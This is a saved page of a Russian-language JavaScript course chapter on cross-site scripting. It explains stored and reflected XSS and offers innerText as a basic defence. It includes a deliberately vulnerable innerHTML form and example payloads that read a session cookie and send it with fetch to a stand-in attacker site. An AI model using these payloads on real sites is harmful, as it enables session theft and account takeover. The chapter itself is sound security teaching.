<html class="" lang="ru"><head><meta charset="utf-8"/><meta content="width=device-width,initial-scale=1" name="viewport"/><title>JavaScript. Профессиональная разработка веб-интерфейсов #25 / HTML Academy</title><script async="" crossorigin="anonymous" integrity="sha384-d/yhnowERvm+7eCU79T/bYjOiMmq4F11ElWYLmt0ktvYEVgqLDazh4+gW9CKMpYW" src="https://cdn.amplitude.com/libs/amplitude-5.2.2-min.gz.js" type="text/javascript"></script><script async="" src="https://www.google-analytics.com/plugins/ua/linkid.js" type="text/javascript"></script><script async="" src="https://mc.yandex.ru/metrika/tag.js"></script><script async="" src="https://www.google-analytics.com/analytics.js" type="text/javascript"></script><script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-W3ZS73J"></script><script>document.documentElement.classList.remove('no-js');</script><script data-project="10" data-sample-rate="0.25" data-sentry="a64ad1fd170847efa544b305c67696aa" data-version="2" src="https://assets.htmlacademy.ru/js/sentry.js"></script><link href="/static/css/octicons-3.3.0.min.css" rel="stylesheet"/><link href="https://assets.htmlacademy.ru/css/core.v197.css" rel="stylesheet"/><link href="https://assets.htmlacademy.ru/css/text.v77.css" rel="stylesheet"/><link href="https://assets.htmlacademy.ru/css/extended-ui-kit.v66.css" rel="stylesheet"/><link href="https://assets.htmlacademy.ru/css/up.v188.css" rel="stylesheet"/><link href="https://assets.htmlacademy.ru/css/blog.v137.css" rel="stylesheet"/><meta content="#2d2d44" name="theme-color"/><link color="#18213F" href="/meta/favicon.svg" rel="mask-icon"/><meta content="JavaScript. Профессиональная разработка веб-интерфейсов #25" name="application-name"/><meta content="JavaScript. Профессиональная разработка веб-интерфейсов #25" name="apple-mobile-web-app-title"/><link href="/meta/javascript-touch-icon.png" rel="apple-touch-icon"/><link href="/meta/javascript-favicon.ico" rel="shortcut icon" type="image/x-icon"/><link href="/meta/javascript.webmanifest" rel="manifest"/><link as="font" crossorigin="anonymous" href="https://assets.htmlacademy.ru/fonts/tt-norms-pro-400-normal.v2.woff2" rel="preload" type="font/woff2"/><link as="font" crossorigin="anonymous" href="https://assets.htmlacademy.ru/fonts/tt-norms-pro-500-normal.v2.woff2" rel="preload" type="font/woff2"/><link as="font" crossorigin="anonymous" href="https://assets.htmlacademy.ru/fonts/tt-norms-pro-700-normal.v2.woff2" rel="preload" type="font/woff2"/><link as="font" crossorigin="anonymous" href="https://assets.htmlacademy.ru/fonts/ubuntu-mono.woff2?cs=7882c41280d8256972fd2b8ee74e2d7d28a857b6" rel="preload" type="font/woff2"/><link as="script" href="https://assets.htmlacademy.ru/js/general.v223.js" rel="preload"/><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-W3ZS73J');</script><script charset="utf-8" src="https://assets.htmlacademy.ru/js/b30983.js"></script><script charset="utf-8" src="https://assets.htmlacademy.ru/js/b42759.js"></script><script charset="utf-8" src="https://assets.htmlacademy.ru/js/c35c41.js"></script><script charset="utf-8" src="https://assets.htmlacademy.ru/js/21aceb.js"></script><script charset="utf-8" src="https://assets.htmlacademy.ru/js/7ea5a2.js"></script><script charset="utf-8" src="https://assets.htmlacademy.ru/js/207ec5.js"></script><script charset="utf-8" src="https://assets.htmlacademy.ru/js/17be68.js"></script><script charset="utf-8" src="https://assets.htmlacademy.ru/js/a0cc69.js"></script><script charset="utf-8" src="https://assets.htmlacademy.ru/js/5dcf46.js"></script><script charset="utf-8" src="https://assets.htmlacademy.ru/js/69be84.js"></script><script charset="utf-8" src="https://assets.htmlacademy.ru/js/24dc6b.js"></script><style>.hljs {display: block;color: black;}.hljs-keyword,.hljs-builtin-name,.hljs-selector-id {color: blue;}.hljs-subst,.hljs-attr {color: black;}.hljs-title,.hljs-type {color: #0000A2;}.hljs-literal {color: rgb(88,92,246);}.hljs-number {color: rgb(0,0,205);}.hljs-regexp,.hljs-string,.bash,.hljs-doctag,.hljs-selector-pseudo,.hljs-code {color: rgb(3,106,7);}.hljs-selector-class,.hljs-variable {color: rgb(49,132,149);}.hljs-selector-tag,.hljs-selector-attr,.hljs-link {color: rgb(197,6,11);}.hljs-attribute {color: rgb(109,121,222);}.hljs-comment,.hljs-quote {color: rgb(188,20,175);}.hljs-meta {color: rgb(104,104,91);}.hljs-tag {color: rgb(0,22,142);}.hljs-addition {background-color: rgba(155, 185, 85, 0.2);}.hljs-deletion {background-color: rgba(255, 0, 0, 0.2);}.hljs-params,.hljs-built_in {color: rgb(49, 132, 149);}</style><script charset="utf-8" src="https://assets.htmlacademy.ru/js/b10dac.js"></script><script charset="utf-8" src="https://assets.htmlacademy.ru/js/8f4e02.js"></script><script charset="utf-8" src="https://assets.htmlacademy.ru/js/183270.js"></script></head><body><noscript><iframe height="0" src="https://www.googletagmanager.com/ns.html?id=GTM-W3ZS73J" style="display:none;visibility:hidden" width="0"></iframe></noscript><div class="page-content page-content--relative page-content--php page-content--up"><div class="blog-section blog-section--page blog-section--black-white"><div class="blog-section__wrap"><div class="blog-section__content"><div class="blog-section__wrap-inner"><div class="post-info post-info--up"><p class="post-info__head"><span class="post-info__type">Теория</span><span class="post-info__timer">~ 9 минут</span></p><h2 class="post-info__title">Глава 7.9. Безопасность. XSS (Cross-site-scripting)</h2></div><div class="post-content"><p>Аббревиатура XSS расшифровывается как Cross-Site Scripting (межсайтовый скриптинг). Если особо не погружаться в детали, смысл атаки заключается во внедрении вредоносного кода в страницу. Атака не затрагивает серверную часть, но напрямую влияет на клиентскую — на пользователей уязвимого сервиса.</p><p>А какой код можно внедрить в страницу? У страницы же нет доступа к базе данных или другому серверному компоненту, где можно получить данные пользователей. Речь идёт о JavaScript-коде. Зловредном коде.</p><p>Вам хорошо известно: для выполнения JavaScript-кода на странице (в контексте фронтенда) необходимо разместить его между тегами <code>&lt;script&gt;&lt;/script&gt;</code>. Про этот способ мы рассказывали в первой главе учебника. Атака XSS в этом и заключается. Злоумышленник внедряет в страницу зловредный JavaScript-код. Пользователь переходит на эту страницу, код выполняется и конфиденциальные данные пользователя отправляются злоумышленнику.</p><p>На практике это может выглядеть так. Представьте персональный блог — вы его разрабатываете в рамках личного проекта. Все зарегистрированные пользователи могут оставлять комментарии к публикациям.</p><p>Всё работает прекрасно, пока не появляется пользователь, который хочет не просто обсуждать публикации, а украсть доступ к учётным записям других пользователей блога. Для этого злоумышленник в поле комментарий пишет какой-то текст, тег <code>&lt;script&gt;</code>, а в нём немного JavaScript-кода. Если не происходит никакой фильтрации, то после публикации такого комментария, код будет выполняться у всех пользователей, посетивших страницу.</p><p>А что опасного может быть в этом коде? Часто разработчики используют <a href="https://ru.wikipedia.org/wiki/Cookie">cookie</a> для хранения идентификатора сессии пользователя. Что такое идентификатор? Это строка с уникальным набором символов, позволяющих отличить одного авторизованного пользователя от другого.</p><p>Зловредный код может прочитать это значение и передать на сервер злоумышленника при помощи Ajax-запроса. В этом и заключается смысл XSS-атаки. Собрав такие идентификаторы, злоумышленник может подставить их себе. Если разработчик не предусмотрел дополнительной защиты, то злоумышленник сможет войти в приложение под учётной записью пользователя.</p><p>Рассмотренный сценарий выше — один из самых популярных, но не единственный. При отсутствии фильтрации, можно выполнить любой JavaScript-код. Например, собрать все данные со страницы (при помощи банальных <code>querySelector</code>) или сделать другие деструктивные действия.</p><h2 id="xss-na-primere">XSS на примере</h2><p>Попробуем взглянуть на проблему с практической точки зрения. Создадим демонстрационное приложение и на реальном примере узнаем, что подразумевается под XSS. В качестве демонстрационного приложения сделаем простую форму для ввода имени. Пользователь вводит имя, отправляет форму, и в параграфе появляется текст с приветствием пользователя. Приложение максимально простое, но оно прекрасно проиллюстрирует проблему:</p><pre class="html language-html"><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"basic-form"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"user-name"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"Отправить"</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"Пожалуйста, представьтесь"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"welcome-user"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-meta">
    'use strict'</span>;

    <span class="hljs-keyword">const</span> submitFormHandler = <span class="hljs-function">(<span class="hljs-params">evt</span>) =&gt;</span> {
        evt.preventDefault();
        welcomeUserElement.innerHTML = <span class="hljs-string">`Привет, <span class="hljs-subst">${userNameElement.value}</span>!`</span>;
    }

    <span class="hljs-keyword">const</span> formElement = <span class="hljs-built_in">document</span>.querySelector(<span class="hljs-string">`#basic-form`</span>);
    <span class="hljs-keyword">const</span> welcomeUserElement = formElement.querySelector(<span class="hljs-string">`#welcome-user`</span>);
    <span class="hljs-keyword">const</span> userNameElement = formElement.querySelector(<span class="hljs-string">`#user-name`</span>);

    formElement.addEventListener(<span class="hljs-string">`submit`</span>, submitFormHandler);
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre><p>Попробуйте открыть страницу в браузере и протестировать приложение. Убедитесь, что всё работает так, как и было запланировано.</p><p></p><figure><img alt="Рисунок 1. Форма для ввода имени" src="file://C:/Users/ivy-m/PycharmProjects/scrapper/scrapper2/results//assets/intensives/javascript/25/book/images/07-08-basic-form.png" title="Рисунок 1. Форма для ввода имени"/><figcaption>Рисунок 1. Форма для ввода имени</figcaption></figure><p></p><p>На первом рисунке продемонстрирован результат работы приложения. В качестве теста мы ввели имя «Igor», и оно отобразилось в параграфе. Приложение работает так, как мы и ожидаем. Теперь давайте вместо имени введём на первый взгляд безобидную строку:</p><pre class="html language-html"><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">""</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">"alert('xss')"</span>&gt;</span>
</code></pre><p>Нажмите кнопку «Отправить». На этот раз в параграфе <code>#welcome-user</code> отобразится «Привет, !», но в довесок к этому вы увидите модальное окно с текстом «xss». Мы внедрили в страницу сторонний JavaScript-код. В примере он показывает бесполезное модальное окно, но вы понимаете, что он может делать намного больше. Выше мы обсуждали несколько негативных сценариев.</p><p></p><figure><img alt="Рисунок 2. XSS в действии" src="file://C:/Users/ivy-m/PycharmProjects/scrapper/scrapper2/results//assets/intensives/javascript/25/book/images/07-08-xss-in-action.png" title="Рисунок 2. XSS в действии"/><figcaption>Рисунок 2. XSS в действии</figcaption></figure><p></p><p>Рассмотрим ещё один пример и разберёмся, как выглядит внедрение XSS изнутри. Представим, что вы разрабатываете какой-нибудь форум любителей аквариумных рыбок. Пусть схематично его разметка выглядит так:</p><pre class="html language-html"><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Здравствуйте, <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"username"</span>&gt;</span>Обычный Пользователь<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">article</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"topic"</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">header</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"topic-header"</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>Разведение пираний в домашних условиях<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
	<span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"topic-body"</span>&gt;</span>
		Всем привет. Я решил завести себе пираний. 
Расскажите, какие плюсы, минусы, подводные камни.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">footer</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"posted-by"</span>&gt;</span>
        От <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"poster-name"</span>&gt;</span>Другой Пользователь<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">footer</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">article</span>&gt;</span>
</code></pre><p>Простая разметка — ничего необычного. Один из пользователей, который создал эту тему для обсуждения выбрал при регистрации необычное имя. Вот такое:</p><pre class="js language-js"><code class="hljs javascript">Другой пользователь&lt;<span class="hljs-regexp">/span&gt;&lt;script&gt;const username=document.querySelector('.username').textContent;const sessionCookie=document.cookie.match(/</span>session-token=([^;$]+)/)[<span class="hljs-number">1</span>];fetch(<span class="hljs-string">'http:/www.malicious-site.com'</span>,{<span class="hljs-attr">method</span>: <span class="hljs-string">'post'</span>,<span class="hljs-attr">body</span>:<span class="hljs-built_in">JSON</span>.stringify({username,sessionCookie})});&lt;/script&gt;
</code></pre><p>Что произойдёт, если другой участник обсуждения просмотрит эту тему? Разметка страницы начнёт выглядеть следующим образом (отформатировано для читабельности):</p><pre class="html language-html"><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Здравствуйте, <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"username"</span>&gt;</span>Обычный Пользователь<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">article</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"topic"</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">header</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"topic-header"</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>Разведение пираний в домашних условиях<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
	<span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"topic-body"</span>&gt;</span>
		Всем привет. Я решил завести себе пираний. 
Расскажите, какие плюсы, минусы, подводные камни.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">footer</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"posted-by"</span>&gt;</span>
        От <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"poster-name"</span>&gt;</span>Другой Пользователь<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
            <span class="hljs-keyword">const</span> username = <span class="hljs-built_in">document</span>.querySelector(<span class="hljs-string">`.username`</span>).textContent;
            <span class="hljs-keyword">const</span> sessionCookie = <span class="hljs-built_in">document</span>.cookie.match(<span class="hljs-regexp">/session-token=([^;$]+)/</span>)[<span class="hljs-number">1</span>];
            fetch(<span class="hljs-string">`http:/www.malicious-site.com`</span>, { 
                <span class="hljs-attr">method</span>: <span class="hljs-string">`post`</span>, 
                <span class="hljs-attr">body</span>: <span class="hljs-built_in">JSON</span>.stringify({username, sessionCookie})
            });
        </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">footer</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">article</span>&gt;</span>
</code></pre><p>Визуально на странице ничего не изменится. Всё то же безумное объявление, но это лишь на первый взгляд. Экзотичное имя пользователя (то самое с кодом) содержало закрывающий тег <code>&lt;/span&gt;</code>. Выходит, что на этом описание элемента с именем пользователя заканчивается. За ним следует тег <code>&lt;script&gt;</code> c JavaScript кодом, который браузер вынужден исполнить.</p><p>Выполнение этого кода приведёт к отправке идентификатора сессии на сервер злоумышленника (<code>www.malicious-site.com</code>). Получив идентификатор, злоумышленник сможет подставить его себе и войти в сервис от имени пользователя. Дальше можно изменить профиль (если сервис позволяет это сделать без ввода пароля) и сделать другие деструктивные действия.</p><h2 id="vidi-xss">Виды XSS</h2><p>Существует два основных вида XSS-атак. Первый — <em>хранимые XSS</em> (Stored XSS). Его мы разобрали в предыдущем примере. Один пользователь вводит зловредные данные, которые сохраняются на сервере и оттуда попадают на страницу другого пользователя.</p><p></p><figure><img alt="Рисунок 3. Stored XSS" src="file://C:/Users/ivy-m/PycharmProjects/scrapper/scrapper2/results//assets/intensives/javascript/25/book/images/07-08-stored-xss.png" title="Рисунок 3. Stored XSS"/><figcaption>Рисунок 3. Stored XSS</figcaption></figure><p></p><p>Другой вид — <em>отражённые XSS</em> (Reflected XSS). Атаки этого типа выглядят иначе. Допустим, на форуме любителей рыбок есть поиск по сообщениям. Маршрут на страницу с выдачей результатов может выглядеть так:</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.aquarium-forum.com/search?q=guppy
</code></pre><p>При переходе пользователь увидит страницу примерно с такой разметкой:</p><pre class="html language-html"><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"query"</span>&gt;</span>
	Результаты поиска по запросу <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"query-text"</span>&gt;</span>guppy<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>:
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"result"</span>&gt;</span>
	<span class="hljs-comment">&lt;!-- результаты поиска --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre><p>Ничего необычного в этой разметке нет, но представьте, что один из пользователей форума любителей рыбок получит на свой email провокационное письмо: «Шокирующая правда о гуппи! Рыбки не переносят… (продолжение по ссылке)». Пользователь на эмоциях переходит по ней (он видит, что она ведёт на его любимый форум) и видит вполне ожидаемую страницу с результатами поиска. Только без шокирующих новостей, но идентификатор его сессии уже улетел злоумышленнику. Ссылка в письме выглядела так:</p><pre class="language-"><code class="hljs xml">http://www.aquarium-forum.com/search?q=guppy<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">fetch(<span class="hljs-string">'http:/www.malicious-site.com?cookie='</span>+<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre><p>После перехода по ссылке, разметка страницы преобразилась и обзавелась одной строкой кода на JavaScript. Визуально это незаметно, но браузер выполнит код, который не предполагал разработчик:</p><pre class="html language-html"><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"query"</span>&gt;</span>
	Результаты поиска по запросу <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"query-text"</span>&gt;</span>guppy
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
	fetch(<span class="hljs-string">'http:/www.malicious-site.com?cookie='</span> + <span class="hljs-built_in">document</span>.cookie);
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>:
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"result"</span>&gt;</span>
	<span class="hljs-comment">&lt;!-- результаты поиска --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre><p></p><figure><img alt="Рисунок 4. Reflected XSS" src="file://C:/Users/ivy-m/PycharmProjects/scrapper/scrapper2/results//assets/intensives/javascript/25/book/images/07-08-reflected-xss.png" title="Рисунок 4. Reflected XSS"/><figcaption>Рисунок 4. Reflected XSS</figcaption></figure><p></p><h2 id="zashchita-ot-xss">Защита от XSS</h2><p>Основная причина появления XSS заключается в недостаточной фильтрации входных данных. Мы это видели на двух примерах. Давайте подумаем, как бороться с этой проблемой. Начнём с простого: не стоит вставлять пользовательские данные в свойство <code>innerHTML</code>.</p><p>Если пользователь пришлёт разметку с кодом на JavaScript, то браузер интерпретирует код и станут возможны сценарии, о которых говорили выше. Что же делать? Самый простой вариант: вместо <code>innerHTML</code> применять <code>innerText</code>. Тогда содержимое будет отображаться как простой текст.</p><h2 id="rezyume">Резюме</h2><p>XSS атаки представляют серьёзную угрозу для веб-приложений. В этом разделе мы рассмотрели теорию и один из самых простых вариантов защиты. Конечно, это решение нельзя назвать серебряной пулей. К вопросам безопасности следует подходить комплексно: как на клиенте, так и на сервере. Запомните главное правило: любые данные, полученные от пользователя, по умолчанию нельзя считать безопасными.</p></div><div class="card card--orphus"><div class="card__content"><p><svg aria-hidden="true" height="16" width="16"><use xlink:href="/img/sprites/octicons.v10.svg#shield-16"></use></svg> Если вы обнаружили ошибку или неработающую ссылку, выделите ее и нажмите Ctrl + Enter</p></div></div></div></div></div></div></div> <script id="" type="text/javascript">(function(a,e,f,g,b,c,d){a[b]=a[b]||function(){(a[b].a=a[b].a||[]).push(arguments)};a[b].l=1*new Date;c=e.createElement(f);d=e.getElementsByTagName(f)[0];c.async=1;c.src=g;d.parentNode.insertBefore(c,d)})(window,document,"script","https://mc.yandex.ru/metrika/tag.js","ym");ym(51609551,"init",{id:51609551,clickmap:!0,trackLinks:!0,accurateTrackBounce:!0,webvisor:!0});</script> <noscript><div><img alt="" src="file://https://mc.yandex.ru/watch/51609551" style="position:absolute; left:-9999px;"/></div></noscript> <div class="modal" data-item="0"><div class="modal__inner"><div class="modal__wrapper js-tutor-info hidden"><button class="modal__close icon-close" data-modal="close" title="Закрыть" type="button"></button><h3 class="modal__header text-left">Мой наставник</h3><p>Для полноценного прохождения курса вам нужно выбрать наставника.</p><p>После выбора вы сможете всегда держать под рукой его контакты (почту и ссылки на профиль в соцсетях, которые
      он укажет для связи со своими студентами), а также расписание консультаций.</p><p>Вы в любой момент можете поменять наставника, если вам кажется, что с текущим наладить работу не получается.</p></div><div class="modal__wrapper js-projects-info hidden"><button class="modal__close icon-close" data-modal="close" title="Закрыть" type="button"></button><h3 class="modal__header text-left">Мои проекты</h3><p>Для удобства работы с проектами, мы собрали их в этом блоке.</p><p>Основной личный проект, который вы будете готовить к финальной защите, находится в начале списка и рядом с ним
      стоит иконка <span class="up-icon"><svg aria-hidden="true" height="24" width="24"><use xlink:href="/img/sprites/octicons.v10.svg#heart-24"></use></svg></span>. Если на курсе
      используется учебный проект, то он будет следующим и с иконкой <span class="up-icon"><svg aria-hidden="true" height="24" width="24"><use xlink:href="/img/sprites/octicons.v10.svg#mortar-board-24"></use></svg></span>. Далее будут идти все остальные проекты, если
      для них были созданы репозитории.</p><p>Вы можете выбрать, какой именно проект будет основным, в любой момент прохождения курса, но мы советуем
      определиться с выбором как можно скорее.</p></div><div class="modal__wrapper js-tutor-task-value hidden"><button class="modal__close icon-close" data-modal="close" title="Закрыть" type="button"></button><h3 class="modal__header text-left">Оцените наставника</h3><p>Мы всегда стремимся улучшать качество услуг. И нам важно знать, как идёт ваша работа с наставником.</p><p>Уделите пару секунд вашего времени и дайте нам знать, как обстоят дела.</p><p>Также вы всегда можете задать свои вопросы напрямую <a href="/javascript/25/curator">куратору</a>.</p></div><div class="modal__wrapper js-first-todo hidden"><button class="modal__close icon-close" data-modal="close" title="Закрыть" type="button"></button><h3 class="modal__header text-left">Ваши первые задачи</h3><p>В этом списке мы собрали задачи, с которых начинается обучение на курсе.</p><p>Выполняйте задачи по порядку, а система будет автоматически отмечать галочками ваш прогресс. Когда весь список
      будет выполнен, этот блок закроется и больше не будет вам надоедать.</p></div><div class="modal__wrapper js-add-tutor-resource-request hidden modal--application-consultation"><button class="modal__close icon-close" data-modal="close" title="Закрыть" type="button"></button><h4 class="modal__header text-left">Запись на консультацию</h4><form action="/javascript/25/requests/create" class="consultation-form form" method="post" novalidate=""><div class="form__group radio-button-group"><label class="radio-button"><input checked="" class="radio-button__input" data-type="voice" name="consultation-type" type="radio" value="voice"/><span class="radio-button__text"><svg aria-hidden="true" height="16" width="16"><use xlink:href="/img/sprites/octicons.v10.svg#megaphone-16"></use></svg>
                  Голосовая</span></label><label class="radio-button"><input class="radio-button__input" data-type="text" name="consultation-type" type="radio" value="text"/><span class="radio-button__text"><svg aria-hidden="true" height="16" width="16"><use xlink:href="/img/sprites/octicons.v10.svg#pencil-16"></use></svg>
                  Текстовая</span></label><label class="radio-button"><input class="radio-button__input" data-type="review" name="consultation-type" type="radio" value="code-review"/><span class="radio-button__text"><svg aria-hidden="true" height="16" width="16"><use xlink:href="/img/sprites/octicons.v10.svg#code-review-16"></use></svg>
                  Кодревью</span></label></div><p class="form__text" data-type-content="voice"><b>Голосовая консультация</b> — это живое общение с наставником, который ответит на интересующие вас вопросы.</p><p class="form__text hidden" data-type-content="text"><b>Текстовая консультация</b> — это общение с наставником в чате. Чат доступен 1 день с момента начала консультации.</p><p class="form__text hidden" data-type-content="review"><b>Кодревью</b> — это проверка пулреквеста в репозитории вашего проекта. Наставник оставит комментарии к вашему коду.</p><div class="form__group" data-type-content="voice"><label class="form__label" for="voice-comment">Комментарий</label><div class="form__group-fields"><textarea class="field field--area field--full-width" cols="40" id="voice-comment" name="voice-comment" placeholder="Обсудить как строить сетки на гридах." rows="4"></textarea></div></div><div class="form__group hidden" data-type-content="text"><label class="form__label" for="text-comment">Список вопросов наставнику</label><div class="form__group-fields"><textarea class="field field--area field--full-width" cols="40" id="text-comment" name="text-comment" placeholder="Как строить сетки на гридах? Как правильно доступно скрыть блок?" rows="4"></textarea></div></div><div class="form__group hidden" data-type-content="review"><label class="form__label" for="pr_url">Ссылка на пулреквест</label><div class="form__group-fields"><input class="field field--text field--full-width" id="pr_url" name="pr_url" pattern="^https:\/\/github.com\/htmlacademy-javascript\/97687.+\/pull\/\d+" placeholder="https://github.com/htmlacademy-javascript/97687.../pull/.." required="" type="url" value=""/><p class="form__notice form__notice--red hidden"></p></div></div><div class="form__group hidden" data-type-content="review"><label class="form__label" for="code-review-comment">На что обратить внимание</label><div class="form__group-fields"><textarea class="field field--area field--full-width" cols="40" id="code-review-comment" name="code-review-comment" placeholder="Обратить внимание на строчку 20" rows="4"></textarea></div></div><button class="button button--full-width" type="submit">
        Записаться
    </button></form></div><div class="modal__wrapper js-orphus hidden" data-class-mod="modal--orphus"><button class="modal__close icon-close" data-modal="close" title="Закрыть" type="button"></button><h4 class="modal__header">Нашли опечатку?</h4><form action="/api/orphus" class="modal__form form"><input name="token" type="hidden" value="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpbnRlbnNpdmUiOiIyMDkiLCJ1c2VyIjoiOTc2ODciLCJ1cmwiOiJodHRwczpcL1wvdXAuaHRtbGFjYWRlbXkucnVcL2phdmFzY3JpcHRcLzI1XC9ib29rXC83LjkifQ.J4s-8L_1exypWNHmld0HixUelFKmH6FRJI5utfwc27s"/><div class="form__group"><div class="form__group-fields"><textarea class="field field--area field--full-width" cols="40" id="comment" name="comment" placeholder="Необязательно" rows="4"></textarea></div></div><button class="button button--full-width modal__button" type="submit">
        Отправить
    </button></form></div></div></div><script src="https://assets.htmlacademy.ru/js/up.v161.js"></script><script async="" data-assets="https://assets.htmlacademy.ru" data-require="toggle,tabs,tab-switcher,modal,ajax,autocomplete,orphus,newsfeed-messages,highlight,side-menu,github-embed,modal,form,tabs" src="https://assets.htmlacademy.ru/js/general.v223.js"></script><script async="" src="/static/js/scripts.13.js"></script><script src="https://assets.htmlacademy.ru/js/blog.v105.js"></script><script id="" type="text/javascript">(function(e,a){function f(b,a){b.prototype[a]=function(){this._q.push([a].concat(Array.prototype.slice.call(arguments,0)));return this}}function g(b){function a(a){b[a]=function(){b._q.push([a].concat(Array.prototype.slice.call(arguments,0)))}}for(var c=0;c<h.length;c++)a(h[c])}var c=e.amplitude||{_q:[],_iq:{}},b=a.createElement("script");b.type="text/javascript";b.integrity="sha384-d/yhnowERvm+7eCU79T/bYjOiMmq4F11ElWYLmt0ktvYEVgqLDazh4+gW9CKMpYW";b.crossOrigin="anonymous";b.async=!0;b.src="https://cdn.amplitude.com/libs/amplitude-5.2.2-min.gz.js";
